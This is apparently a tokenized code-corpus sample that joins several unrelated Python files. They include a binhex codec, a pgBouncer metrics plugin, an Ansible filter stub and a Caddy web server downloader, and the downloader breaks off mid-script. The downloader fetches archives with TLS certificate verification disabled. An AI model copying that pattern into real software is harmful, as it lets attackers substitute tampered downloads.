<newline> self . rlen = rlen <newline> self . _writeinfo ( name , finfo ) <newline> self . state = _DID_HEADER <newline> <dedent> def _writeinfo ( self , name , finfo ) : <newline> <indent> nl = len ( name ) <newline> if nl > 63 : <newline> <indent> raise Error , 'Filename ▁ too ▁ long' <newline> <dedent> d = chr ( nl ) + name + '\0' <newline> d2 = finfo . Type + finfo . Creator <newline>  # ▁ Force ▁ all ▁ structs ▁ to ▁ be ▁ packed ▁ with ▁ big-endian <encdom> d3 = struct . pack ( '>h' , finfo . Flags ) <newline> d4 = struct . pack ( '>ii' , self . dlen , self . rlen ) <newline> info = d + d2 + d3 + d4 <newline> self . _write ( info ) <newline> self . _writecrc ( ) <newline> <dedent> def _write ( self , data ) : <newline> <indent> self . crc = binascii . crc_hqx ( data , self . crc ) <newline> self . ofp . write ( data ) <newline> <dedent> def _writecrc ( self ) : <newline>  # ▁ XXXX ▁ Should ▁ this ▁ be ▁ here?? <encdom>  # ▁ self.crc ▁ = ▁ binascii.crc_hqx('\0\0', ▁ self.crc) <encdom> <indent> if self . crc < 0 : <newline> <indent> fmt = '>h' <newline> <dedent> else : <newline> <indent> fmt = '>H' <newline> <dedent> self . ofp . write ( struct . pack ( fmt , self . crc ) ) <newline> self . crc = 0 <newline> <dedent> def write ( self , data ) : <newline> <indent> if self . state != _DID_HEADER : <newline> <indent> raise Error , 'Writing ▁ data ▁ at ▁ the ▁ wrong ▁ time' <newline> <dedent> self . dlen = self . dlen - len ( data ) <newline> self . _write ( data ) <newline> <dedent> def close_data ( self ) : <newline> <indent> if self . dlen != 0 : <newline> <indent> raise Error , 'Incorrect ▁ data ▁ size, ▁ diff=%r' % ( self . rlen , ) <newline> <dedent> self . _writecrc ( ) <newline> self . state = _DID_DATA <newline> <dedent> def write_rsrc ( self , data ) : <newline> <indent> if self . state < _DID_DATA : <newline> <indent> self . close_data ( ) <newline> <dedent> if self . state != _DID_DATA : <newline> <indent> raise Error , 'Writing ▁ resource ▁ data ▁ at ▁ the ▁ wrong ▁ time' <newline> <dedent> self . rlen = self . rlen - len ( data ) <newline> self . _write ( data ) <newline> <dedent> def close ( self ) : <newline> <indent> if self . state < _DID_DATA : <newline> <indent> self . close_data ( ) <newline> <dedent> if self . state != _DID_DATA : <newline> <indent> raise Error , 'Close ▁ at ▁ the ▁ wrong ▁ time' <newline> <dedent> if self . rlen != 0 : <newline> <indent> raise Error , "Incorrect ▁ resource-datasize, ▁ diff=%r" % ( self . rlen , ) <newline> <dedent> self . _writecrc ( ) <newline> self . ofp . close ( ) <newline> self . state = None <newline> del self . ofp <newline> <dedent> <dedent> def binhex ( inp , out ) : <newline> <indent>  """ (infilename, ▁ outfilename) ▁ - ▁ Create ▁ binhex-encoded ▁ copy ▁ of ▁ a ▁ file """  <newline> finfo = getfileinfo ( inp ) <newline> ofp = BinHex ( finfo , out ) <newline> ifp = open ( inp , 'rb' ) <newline>  # ▁ XXXX ▁ Do ▁ textfile ▁ translation ▁ on ▁ non-mac ▁ systems <encdom> while 1 : <newline> <indent> d = ifp . read ( 128000 ) <newline> if not d : break <newline> ofp . write ( d ) <newline> <dedent> ofp . close_data ( ) <newline> ifp . close ( ) <newline> ifp = openrsrc ( inp , 'rb' ) <newline> while 1 : <newline> <indent> d = ifp . read ( 128000 ) <newline> if not d : break <newline> ofp . write_rsrc ( d ) <newline> <dedent> ofp . close ( ) <newline> ifp . close ( ) <newline> <dedent> class _Hqxdecoderengine : <newline> <indent>  """ Read ▁ data ▁ via ▁ the ▁ decoder ▁ in ▁ 4-byte ▁ chunks """  <newline> def __init__ ( self , ifp ) : <newline> <indent> self . ifp = ifp <newline> self . eof = 0 <newline> <dedent> def read ( self , totalwtd ) : <newline> <indent>  """ Read ▁ at ▁ least ▁ wtd ▁ bytes ▁ (or ▁ until ▁ EOF) """  <newline> decdata = '' <newline> wtd = totalwtd <newline>  # ▁ The ▁ loop ▁ here ▁ is ▁ convoluted, ▁ since ▁ we ▁ don't ▁ really ▁ now ▁ how <encdom>  # ▁ much ▁ to ▁ decode: ▁ there ▁ may ▁ be ▁ newlines ▁ in ▁ the ▁ incoming ▁ data. <encdom> while wtd > 0 : <newline> <indent> if self . eof : return decdata <newline> wtd = ( ( wtd + 2 ) // 3 ) * 4 <newline> data = self . ifp . read ( wtd ) <newline>  # ▁ Next ▁ problem: ▁ there ▁ may ▁ not ▁ be ▁ a ▁ complete ▁ number ▁ of <encdom>  # ▁ bytes ▁ in ▁ what ▁ we ▁ pass ▁ to ▁ a2b. ▁ Solve ▁ by ▁ yet ▁ another <encdom>  # ▁ loop. <encdom> while 1 : <newline> <indent> try : <newline> <indent> decdatacur , self . eof = binascii . a2b_hqx ( data ) <newline> break <newline> <dedent> except binascii . Incomplete : <newline> <indent> pass <newline> <dedent> newdata = self . ifp . read ( 1 ) <newline> if not newdata : <newline> <indent> raise Error , 'Premature ▁ EOF ▁ on ▁ binhex ▁ file' <newline> <dedent> data = data + newdata <newline> <dedent> decdata = decdata + decdatacur <newline> wtd = totalwtd - len ( decdata ) <newline> if not decdata and not self . eof : <newline> <indent> raise Error , 'Premature ▁ EOF ▁ on ▁ binhex ▁ file' <newline> <dedent> <dedent> return decdata <newline> <dedent> def close ( self ) : <newline> <indent> self . ifp . close ( ) <newline> <dedent> <dedent> class _Rledecoderengine : <newline> <indent>  """ Read ▁ data ▁ via ▁ the ▁ RLE-coder """  <newline> def __init__ ( self , ifp ) : <newline> <indent> self . ifp = ifp <newline> self . pre_buffer = '' <newline> self . post_buffer = '' <newline> self . eof = 0 <newline> <dedent> def read ( self , wtd ) : <newline> <indent> if wtd > len ( self . post_buffer ) : <newline> <indent> self . _fill ( wtd - len ( self . post_buffer ) ) <newline> <dedent> rv = self . post_buffer [ : wtd ] <newline> self . post_buffer = self . post_buffer [ wtd : ] <newline> return rv <newline> <dedent> def _fill ( self , wtd ) : <newline> <indent> self . pre_buffer = self . pre_buffer + self . ifp . read ( wtd + 4 ) <newline> if self . ifp . eof : <newline> <indent> self . post_buffer = self . post_buffer + binascii . rledecode_hqx ( self . pre_buffer ) <newline> self . pre_buffer = '' <newline> return <newline>  # ▁ Obfuscated ▁ code ▁ ahead. ▁ We ▁ have ▁ to ▁ take ▁ care ▁ that ▁ we ▁ don't <encdom>  # ▁ end ▁ up ▁ with ▁ an ▁ orphaned ▁ RUNCHAR ▁ later ▁ on. ▁ So, ▁ we ▁ keep ▁ a ▁ couple <encdom>  # ▁ of ▁ bytes ▁ in ▁ the ▁ buffer, ▁ depending ▁ on ▁ what ▁ the ▁ end ▁ of <encdom>  # ▁ the ▁ buffer ▁ looks ▁ like: <encdom>  # ▁'\220\0\220' ▁ - ▁ Keep ▁ 3 ▁ bytes: ▁ repeated ▁ \220 ▁ (escaped ▁ as ▁ \220\0) <encdom>  # ▁'?\220' ▁ - ▁ Keep ▁ 2 ▁ bytes: ▁ repeated ▁ something-else <encdom>  # ▁'\220\0' ▁ - ▁ Escaped ▁ \220: ▁ Keep ▁ 2 ▁ bytes. <encdom>  # ▁'?\220?' ▁ - ▁ Complete ▁ repeat ▁ sequence: ▁ decode ▁ all <encdom>  # ▁ otherwise: ▁ keep ▁ 1 ▁ byte. <encdom> <dedent> mark = len ( self . pre_buffer ) <newline> if self . pre_buffer [ - 3 : ] == RUNCHAR + '\0' + RUNCHAR : <newline> <indent> mark = mark - 3 <newline> <dedent> elif self . pre_buffer [ - 1 ] == RUNCHAR : <newline> <indent> mark = mark - 2 <newline> <dedent> elif self . pre_buffer [ - 2 : ] == RUNCHAR + '\0' : <newline> <indent> mark = mark - 2 <newline> <dedent> elif self . pre_buffer [ - 2 ] == RUNCHAR : <newline> <indent> pass  # ▁ Decode ▁ all <encdom> <newline> <dedent> else : <newline> <indent> mark = mark - 1 <newline> <dedent> self . post_buffer = self . post_buffer + binascii . rledecode_hqx ( self . pre_buffer [ : mark ] ) <newline> self . pre_buffer = self . pre_buffer [ mark : ] <newline> <dedent> def close ( self ) : <newline> <indent> self . ifp . close ( ) <newline> <dedent> <dedent> class HexBin : <newline> <indent> def __init__ ( self , ifp ) : <newline> <indent> if type ( ifp ) == type ( '' ) : <newline> <indent> ifp = open ( ifp ) <newline>  # ▁ Find ▁ initial ▁ colon. <encdom> <dedent> while 1 : <newline> <indent> ch = ifp . read ( 1 ) <newline> if not ch : <newline> <indent> raise Error , "No ▁ binhex ▁ data ▁ found" <newline>  # ▁ Cater ▁ for ▁ \n ▁ terminated ▁ lines ▁ (which ▁ show ▁ up ▁ as ▁ \n , ▁ hence <encdom>  # ▁ all ▁ lines ▁ start ▁ with ▁ ) <encdom> <dedent> if ch == '' : <newline> <indent> continue <newline> <dedent> if ch == ':' : <newline> <indent> break <newline> <dedent> if ch != ' \n ' : <newline> <indent> dummy = ifp . readline ( ) <newline> <dedent> <dedent> hqxifp = _Hqxdecoderengine ( ifp ) <newline> self . ifp = _Rledecoderengine ( hqxifp ) <newline> self . crc = 0 <newline> self . _readheader ( ) <newline> <dedent> def _read ( self , len ) : <newline> <indent> data = self . ifp . read ( len ) <newline> self . crc = binascii . crc_hqx ( data , self . crc ) <newline> return data <newline> <dedent> def _checkcrc ( self ) : <newline> <indent> filecrc = struct . unpack ( '>h' , self . ifp . read ( 2 ) ) [ 0 ] & 0xffff <newline>  # self.crc ▁ = ▁ binascii.crc_hqx('\0\0', ▁ self.crc) <encdom>  # ▁ XXXX ▁ Is ▁ this ▁ needed?? <encdom> self . crc = self . crc & 0xffff <newline> if filecrc != self . crc : <newline> <indent> raise Error , 'CRC ▁ error, ▁ computed ▁ %x, ▁ read ▁ %x' % ( self . crc , filecrc ) <newline> <dedent> self . crc = 0 <newline> <dedent> def _readheader ( self ) : <newline> <indent> len = self . _read ( 1 ) <newline> fname = self . _read ( ord ( len ) ) <newline> rest = self . _read ( 1 + 4 + 4 + 2 + 4 + 4 ) <newline> self . _checkcrc ( ) <newline> type = rest [ 1 : 5 ] <newline> creator = rest [ 5 : 9 ] <newline> flags = struct . unpack ( '>h' , rest [ 9 : 11 ] ) [ 0 ] <newline> self . dlen = struct . unpack ( '>l' , rest [ 11 : 15 ] ) [ 0 ] <newline> self . rlen = struct . unpack ( '>l' , rest [ 15 : 19 ] ) [ 0 ] <newline> self . FName = fname <newline> self . FInfo = FInfo ( ) <newline> self . FInfo . Creator = creator <newline> self . FInfo . Type = type <newline> self . FInfo . Flags = flags <newline> self . state = _DID_HEADER <newline> <dedent> def read ( self , * n ) : <newline> <indent> if self . state != _DID_HEADER : <newline> <indent> raise Error , 'Read ▁ data ▁ at ▁ wrong ▁ time' <newline> <dedent> if n : <newline> <indent> n = n [ 0 ] <newline> n = min ( n , self . dlen ) <newline> <dedent> else : <newline> <indent> n = self . dlen <newline> <dedent> rv = '' <newline> while len ( rv ) < n : <newline> <indent> rv = rv + self . _read ( n - len ( rv ) ) <newline> <dedent> self . dlen = self . dlen - n <newline> return rv <newline> <dedent> def close_data ( self ) : <newline> <indent> if self . state != _DID_HEADER : <newline> <indent> raise Error , 'close_data ▁ at ▁ wrong ▁ time' <newline> <dedent> if self . dlen : <newline> <indent> dummy = self . _read ( self . dlen ) <newline> <dedent> self . _checkcrc ( ) <newline> self . state = _DID_DATA <newline> <dedent> def read_rsrc ( self , * n ) : <newline> <indent> if self . state == _DID_HEADER : <newline> <indent> self . close_data ( ) <newline> <dedent> if self . state != _DID_DATA : <newline> <indent> raise Error , 'Read ▁ resource ▁ data ▁ at ▁ wrong ▁ time' <newline> <dedent> if n : <newline> <indent> n = n [ 0 ] <newline> n = min ( n , self . rlen ) <newline> <dedent> else : <newline> <indent> n = self . rlen <newline> <dedent> self . rlen = self . rlen - n <newline> return self . _read ( n ) <newline> <dedent> def close ( self ) : <newline> <indent> if self . rlen : <newline> <indent> dummy = self . read_rsrc ( self . rlen ) <newline> <dedent> self . _checkcrc ( ) <newline> self . state = _DID_RSRC <newline> self . ifp . close ( ) <newline> <dedent> <dedent> def hexbin ( inp , out ) : <newline> <indent>  """ (infilename, ▁ outfilename) ▁ - ▁ Decode ▁ binhexed ▁ file """  <newline> ifp = HexBin ( inp ) <newline> finfo = ifp . FInfo <newline> if not out : <newline> <indent> out = ifp . FName <newline> <dedent> ofp = open ( out , 'wb' ) <newline>  # ▁ XXXX ▁ Do ▁ translation ▁ on ▁ non-mac ▁ systems <encdom> while 1 : <newline> <indent> d = ifp . read ( 128000 ) <newline> if not d : break <newline> ofp . write ( d ) <newline> <dedent> ofp . close ( ) <newline> ifp . close_data ( ) <newline> d = ifp . read_rsrc ( 128000 ) <newline> if d : <newline> <indent> ofp = openrsrc ( out , 'wb' ) <newline> ofp . write ( d ) <newline> while 1 : <newline> <indent> d = ifp . read_rsrc ( 128000 ) <newline> if not d : break <newline> ofp . write ( d ) <newline> <dedent> ofp . close ( ) <newline> <dedent> ifp . close ( ) <newline> <dedent> def _test ( ) : <newline> <indent> fname = sys . argv [ 1 ] <newline> binhex ( fname , fname + '.hqx' ) <newline> hexbin ( fname + '.hqx' , fname + '.viahqx' ) <newline>  # hexbin(fname, ▁ fname+'.unpacked') <encdom> sys . exit ( 1 ) <newline> <dedent> if __name__ == '__main__' : <newline> <indent> _test ( ) <newline> <dedent>
 """ All ▁ this ▁ stuff ▁ is ▁ to ▁ get ▁ the ▁ version ▁ from ▁ setup.py. """  <newline> from pkg_resources import get_distribution , DistributionNotFound <newline> import os . path <newline> try : <newline> <indent> _dist = get_distribution ( 'pyprf' ) <newline>  # ▁ Normalize ▁ case ▁ for ▁ Windows ▁ systems <encdom> dist_loc = os . path . normcase ( _dist . location ) <newline> here = os . path . normcase ( __file__ ) <newline> if not here . startswith ( os . path . join ( dist_loc , 'pyprf' ) ) : <newline>  # ▁ not ▁ installed, ▁ but ▁ there ▁ is ▁ another ▁ version ▁ that ▁ *is* <encdom> <indent> raise DistributionNotFound <newline> <dedent> <dedent> except DistributionNotFound : <newline> <indent> __version__ = 'Version ▁ information ▁ not ▁ found. ▁ Please ▁ install ▁ this ▁ project ▁ \ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ through ▁ pip.)' <newline> <dedent> else : <newline> <indent> __version__ = _dist . version <newline> <dedent>
 """ <strnewline> pgBouncer ▁ Plugin ▁ Support <strnewline> <strnewline> """  <newline> import logging <newline> from newrelic_python_agent . plugins import postgresql <newline> LOGGER = logging . getLogger ( __name__ ) <newline> class PgBouncer ( postgresql . PostgreSQL ) : <newline> <indent> GUID = 'com.meetme.newrelic_pgbouncer_agent' <newline> MULTIROW = [ 'POOLS' , 'STATS' ] <newline> def add_pgbouncer_stats ( self , stats ) : <newline> <indent> self . add_gauge_value ( 'Overview/Databases' , 'databases' , stats [ 'LISTS' ] [ 'databases' ] ) <newline> self . add_gauge_value ( 'Overview/Pools' , 'pools' , stats [ 'LISTS' ] [ 'pools' ] ) <newline> self . add_gauge_value ( 'Overview/Users' , 'users' , stats [ 'LISTS' ] [ 'users' ] ) <newline> self . add_gauge_value ( 'Overview/Clients/Free' , 'clients' , stats [ 'LISTS' ] [ 'free_clients' ] ) <newline> self . add_gauge_value ( 'Overview/Clients/Used' , 'clients' , stats [ 'LISTS' ] [ 'used_clients' ] ) <newline> self . add_gauge_value ( 'Overview/Servers/Free' , 'servers' , stats [ 'LISTS' ] [ 'free_servers' ] ) <newline> self . add_gauge_value ( 'Overview/Servers/Used' , 'servers' , stats [ 'LISTS' ] [ 'used_servers' ] ) <newline> requests = 0 <newline> for database in stats [ 'STATS' ] : <newline> <indent> metric = 'Database/%s' % database [ 'database' ] <newline> self . add_derive_value ( '%s/Query ▁ Time' % metric , 'seconds' , database [ 'total_query_time' ] ) <newline>  # ▁ Handle ▁ breaking ▁ changes ▁ in ▁ pgbouncer ▁ >=1.8 <encdom> if 'total_requests' in database : <newline> <indent> self . add_derive_value ( '%s/Requests' % metric , 'requests' , database [ 'total_requests' ] ) <newline> requests += database [ 'total_requests' ] <newline> <dedent> elif 'total_query_count' in database :  # ▁ new ▁ metric ▁ name ▁ as ▁ of ▁ 1.8 <encdom> <newline> <indent> self . add_derive_value ( '%s/Requests' % metric , 'requests' , database [ 'total_query_count' ] ) <newline> requests += database [ 'total_query_count' ] <newline> <dedent> self . add_derive_value ( '%s/Data ▁ Sent' % metric , 'bytes' , database [ 'total_sent' ] ) <newline> self . add_derive_value ( '%s/Data ▁ Received' % metric , 'bytes' , database [ 'total_received' ] ) <newline> <dedent> self . add_derive_value ( 'Overview/Requests' , 'requests' , requests ) <newline> for pool in stats [ 'POOLS' ] : <newline> <indent> metric = 'Pools/%s' % pool [ 'database' ] <newline> self . add_gauge_value ( '%s/Clients/Active' % metric , 'clients' , pool [ 'cl_active' ] ) <newline> self . add_gauge_value ( '%s/Clients/Waiting' % metric , 'clients' , pool [ 'cl_waiting' ] ) <newline> self . add_gauge_value ( '%s/Servers/Active' % metric , 'servers' , pool [ 'sv_active' ] ) <newline> self . add_gauge_value ( '%s/Servers/Idle' % metric , 'servers' , pool [ 'sv_idle' ] ) <newline> self . add_gauge_value ( '%s/Servers/Login' % metric , 'servers' , pool [ 'sv_login' ] ) <newline> self . add_gauge_value ( '%s/Servers/Tested' % metric , 'servers' , pool [ 'sv_tested' ] ) <newline> self . add_gauge_value ( '%s/Servers/Used' % metric , 'servers' , pool [ 'sv_used' ] ) <newline> self . add_gauge_value ( '%s/Maximum ▁ Wait' % metric , 'seconds' , pool [ 'maxwait' ] ) <newline> <dedent> <dedent> def add_stats ( self , cursor ) : <newline> <indent> stats = dict ( ) <newline> for key in self . MULTIROW : <newline> <indent> stats [ key ] = dict ( ) <newline> cursor . execute ( 'SHOW ▁ %s' % key ) <newline> temp = cursor . fetchall ( ) <newline> stats [ key ] = list ( ) <newline> for row in temp : <newline> <indent> stats [ key ] . append ( dict ( row ) ) <newline> <dedent> <dedent> cursor . execute ( 'SHOW ▁ LISTS' ) <newline> temp = cursor . fetchall ( ) <newline> stats [ 'LISTS' ] = dict ( ) <newline> for row in temp : <newline> <indent> stats [ 'LISTS' ] [ row [ 'list' ] ] = row [ 'items' ] <newline> <dedent> self . add_pgbouncer_stats ( stats ) <newline> <dedent> @ property <newline> def dsn ( self ) : <newline> <indent>  """ Create ▁ a ▁ DSN ▁ to ▁ connect ▁ to <strnewline> <strnewline> ▁ :return ▁ str: ▁ The ▁ DSN ▁ to ▁ connect <strnewline> <strnewline> ▁ """  <newline> dsn = "host='%(host)s' ▁ port=%(port)i ▁ dbname='pgbouncer' ▁ " "user='%(user)s'" % self . config <newline> if self . config . get ( 'password' ) : <newline> <indent> dsn += " ▁ password='%s'" % self . config [ 'password' ] <newline> <dedent> return dsn <newline> <dedent> <dedent>
 # ▁ Make ▁ coding ▁ more ▁ python3-ish <encdom> from __future__ import ( absolute_import , division , print_function ) <newline> __metaclass__ = type <newline> def do_flag ( myval ) : <newline> <indent> return 'flagged' <newline> <dedent> class FilterModule ( object ) : <newline> <indent>  ''' ▁ Ansible ▁ core ▁ jinja2 ▁ filters ▁ '''  <newline> def filters ( self ) : <newline> <indent> return {  # ▁ jinja2 ▁ overrides <encdom> 'flag' : do_flag , 'flatten' : do_flag , } <newline> <dedent> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  """ <strnewline> Routines ▁ for ▁ quality ▁ control ▁ of ▁ GeoDanmark ▁ map ▁ data <strnewline> Copyright ▁ (C) ▁ 2016 <strnewline> Developed ▁ by ▁ Septima.dk ▁ for ▁ the ▁ Danish ▁ Agency ▁ for ▁ Data ▁ Supply ▁ and ▁ Efficiency <strnewline> <strnewline> This ▁ program ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <strnewline> it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <strnewline> the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the ▁ License, ▁ or <strnewline> (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <strnewline> <strnewline> This ▁ program ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <strnewline> but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <strnewline> MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <strnewline> GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <strnewline> <strnewline> You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <strnewline> along ▁ with ▁ this ▁ program. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <strnewline> """  <newline> from . singlelayerrule import SingleLayerRule <newline> from ... . geomutils . errorgeometry import createlinemarker <newline> class UniqueAttributeValue ( SingleLayerRule ) : <newline> <indent>  """ Check ▁ that ▁ all ▁ values ▁ for ▁ a ▁ given ▁ attribute ▁ are ▁ unique ▁ within ▁ the ▁ features. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ name ▁ : ▁ str <strnewline> ▁ Name ▁ if ▁ this ▁ rule ▁ instance <strnewline> ▁ feature_type ▁ : ▁ fot.FeatureType <strnewline> ▁ Feature ▁ type ▁ to ▁ apply ▁ check ▁ to <strnewline> ▁ attributename ▁ : ▁ str <strnewline> ▁ Name ▁ of ▁ attribute ▁ which ▁ must ▁ be ▁ unique <strnewline> ▁ filter ▁ : ▁ str <strnewline> ▁ QGIS ▁ Filter ▁ Expression ▁ which ▁ is ▁ applied ▁ to ▁ features ▁ before ▁ evaluating ▁ this ▁ rule. <strnewline> <strnewline> ▁ """  <newline> def __init__ ( self , name , feature_type , attributename , filter = None ) : <newline> <indent> super ( UniqueAttributeValue , self ) . __init__ ( name , feature_type ) <newline> self . filter = filter <newline> self . attributesneeded = attributename <newline> self . attributename = attributename <newline> self . attributevalues = { } <newline> <dedent> def checkmany ( self , features , reporter , progressreporter ) : <newline> <indent> progressreporter . begintask ( self . name , len ( features ) ) <newline> for feature in features : <newline> <indent> try : <newline> <indent> value = feature [ self . attributename ] <newline> if value in self . attributevalues : <newline>  # ▁ Wooops ▁ not ▁ unique! <encdom> <indent> errorgeom = createlinemarker ( feature , self . attributevalues [ value ] ) <newline> reporter . error ( self . name , self . featuretype , self . attributename + '="' + unicode ( value ) + '" ▁ not ▁ unique' , errorgeom ) <newline> <dedent> else : <newline> <indent> self . attributevalues [ value ] = feature <newline> <dedent> <dedent> except Exception as e : <newline> <indent> reporter . error ( self . name , self . featuretype , "Error ▁ processing ▁ attribute: ▁ {0} ▁ Message: ▁ {1}" . format ( self . attributename , str ( e ) ) , feature ) <newline> <dedent> progressreporter . completed_one ( ) <newline> <dedent> <dedent> <dedent>
from __future__ import print_function <newline> from sys import exit <newline> import sys , os , subprocess , platform , tarfile , zipfile <newline>  # ▁ import ▁ urllib ▁ for ▁ downloading ▁ http ▁ files <encdom> if int ( platform . python_version ( ) [ 0 ] ) >= 3 : <newline> <indent> from urllib . request import urlretrieve <newline> <dedent> else : <newline> <indent> from urllib import urlretrieve <newline>  # ▁ set ▁ text ▁ color <encdom> <dedent> try : <newline> <indent> import colorama <newline> colorama . init ( ) <newline> err = colorama . Back . RED + 'error:' + colorama . Style . RESET_ALL <newline> scs = colorama . Back . GREEN + 'success:' + colorama . Style . RESET_ALL <newline> <dedent> except ImportError : <newline> <indent> err = 'error:' <newline> scs = 'success:' <newline>  # ▁ output ▁ error ▁ on ▁ invalid ▁ command <encdom> <dedent> if len ( sys . argv ) == 1 : <newline> <indent> print ( "not ▁ enough ▁ argument!" ) <newline> exit ( ) <newline> <dedent> if len ( sys . argv ) > 4 : <newline> <indent> print ( "too ▁ much ▁ argument!" ) <newline> exit ( ) <newline>  # ▁ print ▁ information ▁ about ▁ this ▁ tool <encdom> <dedent> if str ( sys . argv [ 1 ] ) in [ "-V" , "--version" ] : <newline> <indent> print ( "Caddy-X" , "v1.0.0 ▁ beta" ) <newline> print ( "Author: ▁ Sayem ▁ Chowdhury" ) <newline> print ( "CLI ▁ tool ▁ for ▁ downloading/building ▁ Caddy ▁ web ▁ server" ) <newline> print ( "Support: ▁ github.com/sayem314/Caddy-X" ) <newline> exit ( ) <newline> <dedent> if not str ( sys . argv [ 1 ] ) in [ "install" , "get" , "build" ] : <newline> <indent> print ( "usage:" , sys . argv [ 0 ] , "install/get/build" ) <newline> print ( "with ▁ plugins:" , sys . argv [ 0 ] , "install/get/build ▁ -p ▁ example.plugin" ) <newline> exit ( ) <newline>  # ▁ set ▁ caddy ▁ web ▁ server ▁ name <encdom> <dedent> caddyname = "caddy ▁ web ▁ server" <newline>  # ▁ get ▁ current ▁ directory <encdom> cwd = os . getcwd ( ) <newline> userpath = os . path . expanduser ( '~' ) <newline> slash = os . sep <newline> caddygo = userpath + slash + 'go' + slash + 'src' + slash + 'github.com' + slash + 'caddyserver' + slash + 'caddy' + slash + 'caddy' <newline>  # ▁ Get ▁ system ▁ type <encdom> whatos = platform . system ( ) . lower ( ) <newline> def Get ( ) : <newline>  # ▁ Get ▁ system ▁ bits <encdom> <indent> getbits = platform . architecture ( ) [ 0 ] <newline> cpubits = "unknown" <newline> if getbits == '64bit' : <newline> <indent> cpubits = "amd64" <newline> cpubitsname = "64bit.." <newline> <dedent> elif getbits == '32bit' : <newline> <indent> cpubits = "386" <newline> cpubitsname = "32bit.." <newline> <dedent> isarm = platform . uname ( ) [ 4 ] . lower ( ) <newline> if isarm [ : 3 ] == 'arm' : <newline> <indent> cpubits = isarm [ : 3 ] + isarm [ 4 ] <newline> if getbits == '64bit' : <newline> <indent> cpubits = 'arm64' <newline> <dedent> cpubitsname = isarm + ".." <newline> <dedent> if isarm == 'aarch64' : <newline> <indent> cpubits = 'arm64' <newline> cpubitsname = "arm ▁ 64bit.." <newline>  # ▁ set ▁ caddy ▁ archive ▁ name <encdom> <dedent> iszip = "no" <newline> filename = "caddy_" + whatos + "_" + getbits + "_custom.tar.gz" <newline> if whatos == 'windows' or whatos == 'darwin' : <newline> <indent> import ssl <newline> iszip = 'yes' <newline> filename = "caddy_" + whatos + "_" + getbits + "_custom.zip" <newline>  # ▁ Check ▁ if ▁ plugin ▁ need ▁ to ▁ be ▁ installed <encdom> <dedent> if len ( sys . argv ) == 3 : <newline> <indent> if str ( sys . argv [ 2 ] ) in [ "-p" , "-P" , "--plugin" , "--plugins" ] : <newline> <indent> print ( err , "you ▁ did ▁ not ▁ pass ▁ any ▁ plugins ▁ to ▁ install" ) <newline> exit ( ) <newline> <dedent> else : <newline> <indent> print ( str ( sys . argv [ 2 ] ) , "is ▁ unknown ▁ parameter!" ) <newline> exit ( ) <newline> <dedent> <dedent> if len ( sys . argv ) >= 3 : <newline> <indent> if str ( sys . argv [ 2 ] ) in [ "-p" , "-P" , "--plugin" , "--plugins" ] : <newline> <indent> plugins = "?plugins=" + sys . argv [ 3 ] + "&license=personal" <newline> printplugin = print ( "downloading" , caddyname , "with ▁ plugin" , str ( sys . argv [ 3 ] ) , "for" , cpubitsname ) <newline> <dedent> else : <newline> <indent> print ( str ( sys . argv [ 3 ] ) , "is ▁ not ▁ a ▁ valid ▁ argument!" ) <newline> exit ( ) <newline> <dedent> <dedent> else : <newline> <indent> plugins = "?license=personal" <newline> printplugin = print ( "downloading" , caddyname , "for" , cpubitsname ) <newline> <dedent> url = "https://caddyserver.com/download/" + whatos + "/" + cpubits + plugins <newline> printplugin <newline> if iszip != 'yes' : <newline> <indent> try : <newline> <indent> urlretrieve ( url , filename ) <newline> <dedent> except IOError : <newline> <indent> print ( err , "is ▁ your ▁ internet ▁ connection ▁ ok?" ) <newline> exit ( ) <newline> <dedent> try : <newline> <indent> tar = tarfile . open ( filename ) <newline> <dedent> except tarfile . ReadError : <newline> <indent> print ( err , "corrupted ▁ file:" , filename ) <newline> exit ( ) <newline> <dedent> tar . extractall ( "caddyserver" ) <newline> tar . close ( ) <newline> print ( scs , "downloaded ▁'caddyserver' ▁ to ▁ current ▁ folder:" , cwd ) <newline> <dedent> else : <newline> <indent> context = ssl . _create_unverified_context ( ) <newline> try : <newline> <indent> urlretrieve ( url , cwd + slash + filename , context = context ) <newline> <dedent> except IOError : <newline> <indent> print ( err , "failed ▁ to ▁ download! ▁ is ▁ your ▁ internet ▁ connection ▁ ok?" ) <newline> exit ( ) <newline> <dedent> try : <newline> <indent> with zipfile . ZipFile ( filename , "r" ) as z : <newline> <indent> z . extractall ( "caddyserver" ) <newline> <dedent> <dedent> except zipfile . BadZipfile : <newline> <indent> print ( err , "corrupted ▁ file:" , filename ) <newline> exit ( ) <newline> <dedent> <dedent> <dedent> def AddPlugin ( plugin ) : <newline>  # ▁ set ▁ import ▁ link ▁ of ▁ plugins <encdom> <indent> print ( "importing ▁ plugin:" , plugin ) <newline> if plugin == 'http.authz' : <newline> <indent> plugin = 'github.com/casbin/caddy-authz' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.awses' : <newline> <indent> plugin = 'github.com/miquella/caddy-awses' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.awslambda' : <newline> <indent> plugin = 'github.com/coopernurse/caddy-awslambda' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.cache' : <newline> <indent> plugin = 'github.com/nicolasazrak/caddy-cache' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> 